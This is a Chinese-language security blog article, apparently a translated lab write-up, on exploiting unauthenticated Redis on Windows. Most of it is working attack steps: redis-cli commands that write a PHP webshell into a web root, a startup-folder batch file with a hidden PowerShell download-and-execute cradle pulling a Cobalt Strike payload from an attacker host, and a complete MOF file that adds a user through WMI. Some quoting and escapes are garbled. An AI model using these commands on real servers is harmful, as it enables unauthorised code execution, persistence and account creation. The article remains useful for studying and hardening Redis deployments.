# Redis未授权访问在windows下的利用

阅读量 **536500**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-31 11:30:46

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01b469184e2e8ba357.jpg)

在某次内网渗透中遇到了redis+windows的环境，由于目标较为敏感因此在本地和uknow大佬一起进行了测试，也因此有了下面的文章。

## 环境搭建

首先下载windows版本的redis

<https://github.com/dmajkic/redis/downloads>

下载的Redis包含32位和64位操作系统，根据自己实际情况选择，本次测试使用的是64位系统。

![](https://p2.ssl.qhimg.com/t01a2a7f88f0ccbce5a.png)

切换到对应目录，命令行下输入`redis-server.exe redis.conf` 运行redis

![](https://p4.ssl.qhimg.com/t01f17cda0dfccc9dec.png)

查看端口6379已经开放，说明Redis启动成功。

![](https://p4.ssl.qhimg.com/t019643b298b5638f1e.png)

在本机使用telnet 连接靶机 `telnet 192.168.1.101 6379`

![](https://p2.ssl.qhimg.com/t01197d8d7200d74395.png)

连接后输入info查看是否成功

![](https://p2.ssl.qhimg.com/t01da300f3529d003d5.png)

也可以通过redis-cli.exe来进行连接

![](https://p4.ssl.qhimg.com/t01ba450dc79c8dd012.png)

**对于windows下的获取权限的方式，网上并不是很多，但是对于Redis未授权漏洞的利用，其最根本的原理就是写文件的利用，个人简单概括一下大致的几种（可能有考虑不周的，大佬们轻喷）  
1、能够获取web绝对路径的，直接写入webshell  
2、写入启动项  
3、写入mof、dll劫持等**

## 漏洞利用

###  写入webshell

第一种写入webshell，需要通过phpinfo或其他的报错方式来获取网站绝对路径

![](https://p4.ssl.qhimg.com/t011c010bc997d51491.png)

然后通过执行如下命令获取shell

**C:UsershpDesktop64bit >redis-cli.exe -h 192.168.1.101 -p 6379  
redis 192.168.1.101:6379> CONFIG SET dir c:/phpstudy/www  
OK  
redis 192.168.1.101:6379> CONFIG SET dbfilename evil.php  
OK  
redis 192.168.1.101:6379> set x “<?php phpinfo();?>”  
OK  
redis 192.168.1.101:6379> save  
OK**

![](https://p2.ssl.qhimg.com/t01d3b29f90b47e3bd7.png)

查看webshell地址

![](https://p2.ssl.qhimg.com/t019c8836d8873ee828.png)

###  写入启动项

第二种写入启动项也是和在linux环境下如果无法获取webshell或写入ssh-keygen情况下写入启动项一样的原理。

windows下的开机启动项的目录为

`C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start
Menu/Programs/startup/`

这边有个小细节，由于Start Menu之间有空格，因此需要用双引号将路径包含。

这种情况下获取shell的方式可以使用mshta，具体可以参考ukonw大佬的博客

<https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html>

另外的方式也有很多，内网中我现在比较喜欢msf和CS的结合，这边使用Cobalt Strike也举个栗子。

先启动CS服务端 ，命令如下：

`root[@kali](https://github.com/kali "@kali"):~/cobaltstrike# ./teamserver
192.168.1.105 233`

![](https://p3.ssl.qhimg.com/t01e96670c7a173d757.png)

在启动客户端，输入密码和地址

![](https://p2.ssl.qhimg.com/t0141237825a45f5522.png)

添加一个Listener 监听器

![](https://p1.ssl.qhimg.com/t01b6b4792318344d39.png)

选择Attacks – Web Drive-By – Script Web Delivery，选择刚才添加的Listener

![](https://p2.ssl.qhimg.com/t014d6a25d801da79a6.png)

点击Launch之后生成如下代码

![](https://p0.ssl.qhimg.com/t017002ac130964495a.png)

`powershell.exe -nop -w hidden -c "IEX ((new-object
net.webclient).downloadstring('http://192.168.1.105:80/a'))"`

直接保存为1.bat即可

其中存在两个小细节，一个是由于dbfile本身是有内容的，因此命令要正常运行必须先换行，经过测试需要两个换行符rn才能正常运行，还有一个是由于本身执行命令中也有双引号，因此需要加入转义

**C:UsershpDesktop64bit >redis-cli.exe -h 192.168.1.101 -p 6379  
redis 192.168.1.101:6379>config set dir
“C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start
Menu/Programs/startup/“  
OK  
redis 192.168.1.101:6379> CONFIG SET dbfilename 1.bat  
OK  
redis 192.168.1.101:6379>set x “rnrnpowershell.exe -nop -w hidden -c ”IEX
((new-object
net.webclient).downloadstring(‘[http://192.168.1.105:80/a’))”rnrn”](http://192.168.1.105:80/a'\)\)%22rnrn%E2%80%9D)  
OK  
redis 192.168.1.101:6379> save  
OK**

![](https://p5.ssl.qhimg.com/t012799dce960060cfa.png)

查看服务器启动项，发现正常写入命令

![](https://p5.ssl.qhimg.com/t01cd91a0b68881bb8e.png)

重启机器，服务器就上线了。

![](https://p2.ssl.qhimg.com/t013cd2ebca441f1586.png)

###  写入MOF

这个也是本次文章的原因，由于不能重启机器也无法获取web目录，想到Mof提权，不过也是有环境限制只能为win2003，也是由于当年玩提权时候很多时候都是找最简方式提权，所以没尝试过这种老式的提权方式，这次也算弥补了一下技术遗憾。

简单描述一下mof提权的原理：

mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。

也就是说在`c:/windows/system32/wbem/mof/`目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。

emmm 这个操作和写入ssh keygen类似，因此还是建议在linux下完成。

首先将如下代码保存为mof文件：

`#pragma namespace("\\.\root\subscription")  
instance of __EventFilter as $EventFilter  
{  
EventNamespace = "Root\Cimv2";  
Name = "filtP2";  
Query = "Select * From __InstanceModificationEvent "  
"Where TargetInstance Isa "Win32_LocalTime" "  
"And TargetInstance.Second = 5";  
QueryLanguage = "WQL";  
};  
instance of ActiveScriptEventConsumer as $Consumer  
{  
Name = "consPCSV2";  
ScriptingEngine = "JScript";  
ScriptText =  
"var WSH = new ActiveXObject("WScript.Shell")nWSH.run("net.exe user 3shine
admin /add")";  
};  
instance of __FilterToConsumerBinding  
{  
Consumer = $Consumer;  
Filter = $EventFilter;  
};`

此处要执行的命令为添加名为3shine的用户

![](https://p1.ssl.qhimg.com/t01c0b07b83f55b7b70.png)

然后执行

`(echo -e "nn"; cat 3shine.txt; echo -e "nn") > foo.txt`

切换到redis目录，运行如下命令

![](https://p5.ssl.qhimg.com/t018bcc65db502f2be6.png)

过一会就看到用户添加成功了。

![](https://p5.ssl.qhimg.com/t01883087680adf4692.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **_____** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170360](/post/id/170360)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)
  * [本地提权](/tag/本地提权)
  * [Redis](/tag/Redis)

 **+1** __17赞

 __收藏

![](https://thirdqq.qlogo.cn/qqapp/101430193/6D4965C3FFE9EA7E435C83E43B861DF2/40)
_____

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

